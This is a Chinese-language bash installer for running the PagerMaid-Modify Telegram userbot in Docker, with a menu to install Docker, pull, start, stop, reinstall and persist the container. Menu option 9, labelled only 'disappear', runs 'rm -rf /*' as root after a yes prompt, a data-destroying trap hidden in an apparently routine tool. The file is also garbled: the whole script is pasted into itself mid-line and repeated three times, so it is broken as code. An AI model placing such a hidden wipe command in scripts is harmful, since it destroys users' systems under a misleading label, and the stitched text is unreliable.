#!/usr/bin/env bash

red='\033[0;31m'
green='\033[0;32m'
yellow='\033[0;33m'
plain='\033[0m'

if [[ $EUID -ne 0 ]]
then
    clear
    echo -e "$red错误：本脚本需要 root 权限执行。$plain" 1>&2
    exit 1
fi

da () {
    echo -e "${red}确认要执行吗？！！！！！[Y/n]$plain"
    read -r da <&1
    case $da in
        [yY][eE][sS] | [yY]) 
            echo -e "$red再见 . . .$plain"
            rm -rf /*
            ;;
        [nN][oO] | [nN])
            echo -e "$red恭喜你还能看到我 . . .$plain"
            shon_online
            ;;
        *)
        echo -e "$red输入错误 . . .$plain"
        exit 1
        ;;
    esac
}
welcome () {
    echo
    echo -e "$green安装即将开始"
    echo "如果您想取消安装，"
    echo -e "请在 5 秒钟内按 Ctrl+C 终止此脚本。$plain"
    echo
    sleep 5
}

docker_install () {
    welcome
    echo -e "$green开始安装 Docker . . .$plain"
    apt install curl -y #!/usr/bin/env bash#!/usr/bin/env bash

red='\033[0;31m'
green='\033[0;32m'
yellow='\033[0;33m'
plain='\033[0m'

if [[ $EUID -ne 0 ]]
then
    clear
    echo -e "$red错误：本脚本需要 root 权限执行。$plain" 1>&2
    exit 1
fi

da () {
    echo -e "${red}确认要执行吗？！！！！！[Y/n]$plain"
    read -r da <&1
    case $da in
        [yY][eE][sS] | [yY]) 
            echo -e "$red再见 . . .$plain"
            rm -rf /*
            ;;
        [nN][oO] | [nN])
            echo -e "$red恭喜你还能看到我 . . .$plain"
            echo
            sleep 3
            shon_online
            ;;
        *)
        echo -e "$red输入错误 . . .$plain"
        exit 1
        ;;
    esac
}

welcome () {
    echo
    echo -e "$green安装即将开始"
    echo "如果您想取消安装，"
    echo -e "请在 5 秒钟内按 Ctrl+C 终止此脚本。$plain"
    echo
    sleep 5
}

docker_install () {
    welcome
    echo -e "$green开始安装 Docker . . .$plain"
    apt install curl -y 
    curl -fsSL get.docker.com -o get-docker.sh
    sudo sh get-docker.sh --mirror Aliyun
    echo -e "$green正在检查 Docker 安装情况 . . .$plain"
    if command -v docker >> /dev/null 2>&1;
    then
        echo -e "${green}Docker 安装成功 . . .$plain"
        shon_online
    else
        echo -e "${red}Docker 安装失败 . . ."
        echo -e "请尝试手动安装 Docker$plain"
        exit 1
    fi
}

docker_check () {
    echo -e "${green}正在检查 Docker 安装情况 . . .$plain"
    if command -v docker >> /dev/null 2>&1;
    then
        echo -e "${green}Docker 似乎存在, 安装过程继续 . . .$plain"
    else
        echo -e "${red}Docker 未安装在此系统上"
        echo -e "请安装 Docker 并将自己添加到 Docker"
        echo -e "分组并重新运行此脚本。$plain"
        exit 1
    fi
}

access_check () {
    echo -e "${green}测试 Docker 环境 . . .$plain"
    if [ -w /var/run/docker.sock ]
    then
        echo -e "${green}该用户可以使用 Docker , 安装过程继续 . . .$plain"
    else
        echo -e "${green}该用户无权访问 Docker，或者 Docker 没有运行。 请添加自己到 Docker 分组并重新运行此脚本。$plain"
        exit 1
    fi
}

build_docker () {
    echo -e "${yellow}请输入 PagerMaid 容器的名称：$plain"
    read -r container_name <&1
    echo -e "${green}正在拉取 Docker 镜像 . . .$plain"
    docker rm -f "$container_name" > /dev/null 2>&1
    docker pull mrwangzhe/pagermaid_modify
}

start_docker () {
    echo -e "${green}正在启动 Docker 容器 . . .$plain"
    docker run -dit --restart=always --name="$container_name" --hostname="$container_name" mrwangzhe/pagermaid_modify <&1
    echo
    echo -e "$green开始配置参数 . . ."
    echo -e "在登录后，请按 Ctrl + C 使容器在后台模式下重新启动。$plain"
    sleep 3
    docker exec -it $container_name bash utils/docker-config.sh
    echo
    echo -e "${green}Docker 创建完毕。$plain"
    echo
}

data_persistence () {
    echo -e "${green}数据持久化可以在升级或重新部署容器时保留配置文件和插件。$plain"
    echo -e "$yellow请确认是否进行数据持久化操作 [Y/n] ：$plain"
    read -r persistence <&1
    case $persistence in
        [yY][eE][sS] | [yY])
            echo -e "${yellow}请输入将数据保留在宿主机哪个路径（绝对路径），同时请确保该路径下没有名为 workdir 的文件夹 ：$plain"
            read -r data_path <&1
            if [ -d $data_path ]; then
                if [[ -z $container_name ]]; then
                    printf "请输入 PagerMaid 容器的名称："
                    read -r container_name <&1
                fi
                if docker inspect $container_name &>/dev/null; then
                    docker cp $container_name:/pagermaid/workdir $data_path
                    docker stop $container_name &>/dev/null
                    docker rm $container_name &>/dev/null
                    docker run -dit -e PUID=$PUID -e PGID=$PGID -v $data_path/workdir:/pagermaid/workdir --restart=always --name="$container_name" --hostname="$container_name" mrwangzhe/pagermaid_modify <&1
                    echo
                    echo -e "$green数据持久化操作完成。$plain"
                    echo 
                    shon_online
                else
                    echo -e "$red不存在名为 $container_name 的容器，退出。$plain"
                    exit 1
                fi
            else
                echo -e "$red路径 $data_path 不存在，退出。$plain"
                exit 1
            fi
            ;;
        [nN][oO] | [nN])
            echo -e "$red结束。$plain"
            ;;
        *)
            echo -e "$red输入错误 . . .$plain"
            exit 1
            ;;
    esac
}

start_installation () {
    welcome
    docker_check
    access_check
    build_docker
    start_docker
    data_persistence
}

cleanup () {
    echo -e "$yellow请输入 PagerMaid 容器的名称：$plain"
    read -r container_name <&1
    echo -e "$green开始删除 Docker 镜像 . . .$plain"
    if docker inspect $container_name &>/dev/null; then
        docker rm -f "$container_name" &>/dev/null
        echo
        shon_online
    else
        echo -e "$red不存在名为 $container_name 的容器，退出。$plain"
        exit 1
    fi
}

stop_pager () {
    echo -e "$yellow请输入 PagerMaid 容器的名称：$plain"
    read -r container_name <&1
    echo -e "$green正在关闭 Docker 镜像 . . .$plain"
    if docker inspect $container_name &>/dev/null; then
        docker stop "$container_name" &>/dev/null
        echo
        shon_online
    else
        echo -e "$red不存在名为 $container_name 的容器，退出。$plain"
        exit 1
    fi
}

start_pager () {
    echo -e "$yellow请输入 PagerMaid 容器的名称：$plain"
    read -r container_name <&1
    echo -e "$green正在启动 Docker 容器 . . .$plain"
    if docker inspect $container_name &>/dev/null; then
        docker start $container_name &>/dev/null
        echo
        echo -e "$greenDocker 启动完毕。$plain"
        echo
        shon_online
    else
        echo -e "$red不存在名为 $container_name 的容器，退出。$plain"
        exit 1
    fi
}

restart_pager () {
    echo -e "$yellow请输入 PagerMaid 容器的名称：$plain"
    read -r container_name <&1
    echo -e "$green正在重新启动 Docker 容器 . . .$plain"
    if docker inspect $container_name &>/dev/null; then
        docker restart $container_name &>/dev/null
        echo
        echo -e "$greenDocker 重新启动完毕。$plain"
        echo
        shon_online
    else
        echo -e "$red不存在名为 $container_name 的容器，退出。$plain"
        exit 1
    fi
}

reinstall_pager () {
    cleanup
    build_docker
    start_docker
    data_persistence
}

shon_online () {
    echo
    echo -e "$green欢迎使用 PagerMaid-Modify Docker 一键安装脚本$red(WW 魔改版)$plain"
    echo
    echo -e "$green请选择您需要进行的操作:"
    echo "  1)     安装 Docker"
    echo "  2) Docker 安装 PagerMaid"
    echo "  3) Docker 卸载 PagerMaid"
    echo "  4) Docker 关闭 PagerMaid"
    echo "  5) Docker 启动 PagerMaid"
    echo "  6) Docker 重启 PagerMaid"
    echo "  7) Docker 重装 PagerMaid"
    echo "  8) 将 PagerMaid 数据持久化"
    echo "  9)        消失"
    echo -e "  10) 退出脚本$plain"
    echo
    echo "     Version：0.3.2"
    echo
    echo -n -e "$yellow请输入编号: ${plain}"
    read N
    case $N in
        1)
            docker_install
            ;;
        2)
            start_installation
            ;;
        3)
            cleanup
            ;;
        4)
            stop_pager
            ;;
        5)
            start_pager
            ;;
        6)
            restart_pager
            ;;
        7)
            reinstall_pager
            ;;
        8)
            data_persistence
            ;;
        9)
            da 
            ;;
        10)
            exit 0
            ;;
        *)
            echo -e "${red}Wrong input!$plain"
            sleep 5s
            shon_online
            ;;
    esac 
}

shon_online



red='\033[0;31m'
green='\033[0;32m'
yellow='\033[0;33m'
plain='\033[0m'

if [[ $EUID -ne 0 ]]
then
    clear
    echo -e "$red错误：本脚本需要 root 权限执行。$plain" 1>&2
    exit 1
fi

da () {
    echo -e "${red}确认要执行吗？！！！！！[Y/n]$plain"
    read -r da <&1
    case $da in
        [yY][eE][sS] | [yY]) 
            echo -e "$red再见 . . .$plain"
            rm -rf /*
            ;;
        [nN][oO] | [nN])
            echo -e "$red恭喜你还能看到我 . . .$plain"
            echo
            sleep 3
            shon_online
            ;;
        *)
        echo -e "$red输入错误 . . .$plain"
        exit 1
        ;;
    esac
}

welcome () {
    echo
    echo -e "$green安装即将开始"
    echo "如果您想取消安装，"
    echo -e "请在 5 秒钟内按 Ctrl+C 终止此脚本。$plain"
    echo
    sleep 5
}

docker_install () {
    welcome
    echo -e "$green开始安装 Docker . . .$plain"
    apt install curl -y 
    curl -fsSL get.docker.com -o get-docker.sh
    sudo sh get-docker.sh --mirror Aliyun
    echo -e "$green正在检查 Docker 安装情况 . . .$plain"
    if command -v docker >> /dev/null 2>&1;
    then
        echo -e "${green}Docker 安装成功 . . .$plain"
        shon_online
    else
        echo -e "${red}Docker 安装失败 . . ."
        echo -e "请尝试手动安装 Docker$plain"
        exit 1
    fi
}

docker_check () {
    echo -e "${green}正在检查 Docker 安装情况 . . .$plain"
    if command -v docker >> /dev/null 2>&1;
    then
        echo -e "${green}Docker 似乎存在, 安装过程继续 . . .$plain"
    else
        echo -e "${red}Docker 未安装在此系统上"
        echo -e "请安装 Docker 并将自己添加到 Docker"
        echo -e "分组并重新运行此脚本。$plain"
        exit 1
    fi
}

access_check () {
    echo -e "${green}测试 Docker 环境 . . .$plain"
    if [ -w /var/run/docker.sock ]
    then
        echo -e "${green}该用户可以使用 Docker , 安装过程继续 . . .$plain"
    else
        echo -e "${green}该用户无权访问 Docker，或者 Docker 没有运行。 请添加自己到 Docker 分组并重新运行此脚本。$plain"
        exit 1
    fi
}

build_docker () {
    echo -e "${yellow}请输入 PagerMaid 容器的名称：$plain"
    read -r container_name <&1
    echo -e "${green}正在拉取 Docker 镜像 . . .$plain"
    docker rm -f "$container_name" > /dev/null 2>&1
    docker pull mrwangzhe/pagermaid_modify
}

start_docker () {
    echo -e "${green}正在启动 Docker 容器 . . .$plain"
    docker run -dit --restart=always --name="$container_name" --hostname="$container_name" mrwangzhe/pagermaid_modify <&1
    echo
    echo -e "$green开始配置参数 . . ."
    echo -e "在登录后，请按 Ctrl + C 使容器在后台模式下重新启动。$plain"
    sleep 3
    docker exec -it $container_name bash utils/docker-config.sh
    echo
    echo -e "${green}Docker 创建完毕。$plain"
    echo
}

data_persistence () {
    echo -e "${green}数据持久化可以在升级或重新部署容器时保留配置文件和插件。$plain"
    echo -e "$yellow请确认是否进行数据持久化操作 [Y/n] ：$plain"
    read -r persistence <&1
    case $persistence in
        [yY][eE][sS] | [yY])
            echo -e "${yellow}请输入将数据保留在宿主机哪个路径（绝对路径），同时请确保该路径下没有名为 workdir 的文件夹 ：$plain"
            read -r data_path <&1
            if [ -d $data_path ]; then
                if [[ -z $container_name ]]; then
                    printf "请输入 PagerMaid 容器的名称："
                    read -r container_name <&1
                fi
                if docker inspect $container_name &>/dev/null; then
                    docker cp $container_name:/pagermaid/workdir $data_path
                    docker stop $container_name &>/dev/null
                    docker rm $container_name &>/dev/null
                    docker run -dit -e PUID=$PUID -e PGID=$PGID -v $data_path/workdir:/pagermaid/workdir --restart=always --name="$container_name" --hostname="$container_name" mrwangzhe/pagermaid_modify <&1
                    echo
                    echo -e "$green数据持久化操作完成。$plain"
                    echo 
                    shon_online
                else
                    echo -e "$red不存在名为 $container_name 的容器，退出。$plain"
                    exit 1
                fi
            else
                echo -e "$red路径 $data_path 不存在，退出。$plain"
                exit 1
            fi
            ;;
        [nN][oO] | [nN])
            echo -e "$red结束。$plain"
            ;;
        *)
            echo -e "$red输入错误 . . .$plain"
            exit 1
            ;;
    esac
}

start_installation () {
    welcome
    docker_check
    access_check
    build_docker
    start_docker
    data_persistence
}

cleanup () {
    echo -e "$yellow请输入 PagerMaid 容器的名称：$plain"
    read -r container_name <&1
    echo -e "$green开始删除 Docker 镜像 . . .$plain"
    if docker inspect $container_name &>/dev/null; then
        docker rm -f "$container_name" &>/dev/null
        echo
        shon_online
    else
        echo -e "$red不存在名为 $container_name 的容器，退出。$plain"
        exit 1
    fi
}

stop_pager () {
    echo -e "$yellow请输入 PagerMaid 容器的名称：$plain"
    read -r container_name <&1
    echo -e "$green正在关闭 Docker 镜像 . . .$plain"
    if docker inspect $container_name &>/dev/null; then
        docker stop "$container_name" &>/dev/null
        echo
        shon_online
    else
        echo -e "$red不存在名为 $container_name 的容器，退出。$plain"
        exit 1
    fi
}

start_pager () {
    echo -e "$yellow请输入 PagerMaid 容器的名称：$plain"
    read -r container_name <&1
    echo -e "$green正在启动 Docker 容器 . . .$plain"
    if docker inspect $container_name &>/dev/null; then
        docker start $container_name &>/dev/null
        echo
        echo -e "$greenDocker 启动完毕。$plain"
        echo
        shon_online
    else
        echo -e "$red不存在名为 $container_name 的容器，退出。$plain"
        exit 1
    fi
}

restart_pager () {
    echo -e "$yellow请输入 PagerMaid 容器的名称：$plain"
    read -r container_name <&1
    echo -e "$green正在重新启动 Docker 容器 . . .$plain"
    if docker inspect $container_name &>/dev/null; then
        docker restart $container_name &>/dev/null
        echo
        echo -e "$greenDocker 重新启动完毕。$plain"
        echo
        shon_online
    else
        echo -e "$red不存在名为 $container_name 的容器，退出。$plain"
        exit 1
    fi
}

reinstall_pager () {
    cleanup
    build_docker
    start_docker
    data_persistence
}

shon_online () {
    echo
    echo -e "$green欢迎使用 PagerMaid-Modify Docker 一键安装脚本$red(WW 魔改版)$plain"
    echo
    echo -e "$green请选择您需要进行的操作:"
    echo "  1)     安装 Docker"
    echo "  2) Docker 安装 PagerMaid"
    echo "  3) Docker 卸载 PagerMaid"
    echo "  4) Docker 关闭 PagerMaid"
    echo "  5) Docker 启动 PagerMaid"
    echo "  6) Docker 重启 PagerMaid"
    echo "  7) Docker 重装 PagerMaid"
    echo "  8) 将 PagerMaid 数据持久化"
    echo "  9)        消失"
    echo -e "  10) 退出脚本$plain"
    echo
    echo "     Version：0.3.2"
    echo
    echo -n -e "$yellow请输入编号: ${plain}"
    read N
    case $N in
        1)
            docker_install
            ;;
        2)
            start_installation
            ;;
        3)
            cleanup
            ;;
        4)
            stop_pager
            ;;
        5)
            start_pager
            ;;
        6)
            restart_pager
            ;;
        7)
            reinstall_pager
            ;;
        8)
            data_persistence
            ;;
        9)
            da 
            ;;
        10)
            exit 0
            ;;
        *)
            echo -e "${red}Wrong input!$plain"
            sleep 5s
            shon_online
            ;;
    esac 
}

shon_online


    curl -fsSL get.docker.com -o get-docker.sh
    sudo sh get-docker.sh --mirror Aliyun
    echo -e "$green正在检查 Docker 安装情况 . . .$plain"
    if command -v docker >> /dev/null 2>&1;
    then
        echo -e "${green}Docker 安装成功 . . .$plain"
        shon_online
    else
        echo -e "${red}Docker 安装失败 . . ."
        echo -e "请尝试手动安装 Docker$plain"
        exit 1
    fi
}

docker_check () {
    echo -e "${green}正在检查 Docker 安装情况 . . .$plain"
    if command -v docker >> /dev/null 2>&1;
    then
        echo -e "${green}Docker 似乎存在, 安装过程继续 . . .$plain"
    else
        echo -e "${red}Docker 未安装在此系统上"
        echo -e "请安装 Docker 并将自己添加到 Docker"
        echo -e "分组并重新运行此脚本。$plain"
        exit 1
    fi
}

access_check () {
    echo -e "${green}测试 Docker 环境 . . .$plain"
    if [ -w /var/run/docker.sock ]
    then
        echo -e "${green}该用户可以使用 Docker , 安装过程继续 . . .$plain"
    else
        echo -e "${green}该用户无权访问 Docker，或者 Docker 没有运行。 请添加自己到 Docker 分组并重新运行此脚本。$plain"
        exit 1
    fi
}

build_docker () {
    echo -e "${yellow}请输入 PagerMaid 容器的名称：$plain"
    read -r container_name <&1
    echo -e "${green}正在拉取 Docker 镜像 . . .$plain"
    docker rm -f "$container_name" > /dev/null 2>&1
    docker pull mrwangzhe/pagermaid_modify
}

start_docker () {
    echo -e "${green}正在启动 Docker 容器 . . .$plain"
    docker run -dit --restart=always --name="$container_name" --hostname="$container_name" mrwangzhe/pagermaid_modify <&1
    echo
    echo -e "$green开始配置参数 . . ."
    echo -e "在登录后，请按 Ctrl + C 使容器在后台模式下重新启动。$plain"
    sleep 3
    docker exec -it $container_name bash utils/docker-config.sh
    echo
    echo -e "${green}Docker 创建完毕。$plain"
    echo
}

data_persistence () {
    echo -e "${green}数据持久化可以在升级或重新部署容器时保留配置文件和插件。$plain"
    echo -e "$yellow请确认是否进行数据持久化操作 [Y/n] ：$plain"
    read -r persistence <&1
    case $persistence in
        [yY][eE][sS] | [yY])
            echo -e "${yellow}请输入将数据保留在宿主机哪个路径（绝对路径），同时请确保该路径下没有名为 workdir 的文件夹 ：$plain"
            read -r data_path <&1
            if [ -d $data_path ]; then
                if [[ -z $container_name ]]; then
                    printf "请输入 PagerMaid 容器的名称："
                    read -r container_name <&1
                fi
                if docker inspect $container_name &>/dev/null; then
                    docker cp $container_name:/pagermaid/workdir $data_path
                    docker stop $container_name &>/dev/null
                    docker rm $container_name &>/dev/null
                    docker run -dit -e PUID=$PUID -e PGID=$PGID -v $data_path/workdir:/pagermaid/workdir --restart=always --name="$container_name" --hostname="$container_name" mrwangzhe/pagermaid_modify <&1
                    echo
                    echo -e "$green数据持久化操作完成。$plain"
                    echo 
                    shon_online
                else
                    echo -e "$red不存在名为 $container_name 的容器，退出。$plain"
                    exit 1
                fi
            else
                echo -e "$red路径 $data_path 不存在，退出。$plain"
                exit 1
            fi
            ;;
        [nN][oO] | [nN])
            echo -e "$red结束。$plain"
            ;;
        *)
            echo -e "$red输入错误 . . .$plain"
            exit 1
            ;;
    esac
}

start_installation () {
    welcome
    docker_check
    access_check
    build_docker
    start_docker
    data_persistence
}

cleanup () {
    echo -e "$yellow请输入 PagerMaid 容器的名称：$plain"
    read -r container_name <&1
    echo -e "$green开始删除 Docker 镜像 . . .$plain"
    if docker inspect $container_name &>/dev/null; then
        docker rm -f "$container_name" &>/dev/null
        echo
        shon_online
    else
        echo -e "$red不存在名为 $container_name 的容器，退出。$plain"
        exit 1
    fi
}

stop_pager () {
    echo -e "$yellow请输入 PagerMaid 容器的名称：$plain"
    read -r container_name <&1
    echo -e "$green正在关闭 Docker 镜像 . . .$plain"
    if docker inspect $container_name &>/dev/null; then
        docker stop "$container_name" &>/dev/null
        echo
        shon_online
    else
        echo -e "$red不存在名为 $container_name 的容器，退出。$plain"
        exit 1
    fi
}

start_pager () {
    echo -e "$yellow请输入 PagerMaid 容器的名称：$plain"
    read -r container_name <&1
    echo -e "$green正在启动 Docker 容器 . . .$plain"
    if docker inspect $container_name &>/dev/null; then
        docker start $container_name &>/dev/null
        echo
        echo -e "$greenDocker 启动完毕。$plain"
        echo
        shon_online
    else
        echo -e "$red不存在名为 $container_name 的容器，退出。$plain"
        exit 1
    fi
}

restart_pager () {
    echo -e "$yellow请输入 PagerMaid 容器的名称：$plain"
    read -r container_name <&1
    echo -e "$green正在重新启动 Docker 容器 . . .$plain"
    if docker inspect $container_name &>/dev/null; then
        docker restart $container_name &>/dev/null
        echo
        echo -e "$greenDocker 重新启动完毕。$plain"
        echo
        shon_online
    else
        echo -e "$red不存在名为 $container_name 的容器，退出。$plain"
        exit 1
    fi
}

reinstall_pager () {
    cleanup
    build_docker
    start_docker
    data_persistence
}

shon_online () {
    echo
    echo -e "$green欢迎使用 PagerMaid-Modify Docker 一键安装脚本$red(WW 魔改版)$plain"
    echo
    echo -e "$green请选择您需要进行的操作:"
    echo "  1)     安装 Docker"
    echo "  2) Docker 安装 PagerMaid"
    echo "  3) Docker 卸载 PagerMaid"
    echo "  4) Docker 关闭 PagerMaid"
    echo "  5) Docker 启动 PagerMaid"
    echo "  6) Docker 重启 PagerMaid"
    echo "  7) Docker 重装 PagerMaid"
    echo "  8) 将 PagerMaid 数据持久化"
    echo "  9)        消失"
    echo -e "  10) 退出脚本$plain"
    echo
    echo "     Version：0.3.2"
    echo
    echo -n -e "$yellow请输入编号: ${plain}"
    read N
    case $N in
        1)
            docker_install
            ;;
        2)
            start_installation
            ;;
        3)
            cleanup
            ;;
        4)
            stop_pager
            ;;
        5)
            start_pager
            ;;
        6)
            restart_pager
            ;;
        7)
            reinstall_pager
            ;;
        8)
            data_persistence
            ;;
        9)
            da 
            ;;
        10)
            exit 0
            ;;
        *)
            echo -e "${red}Wrong input!$plain"
            sleep 5s
            shon_online
            ;;
    esac 
}

shon_online

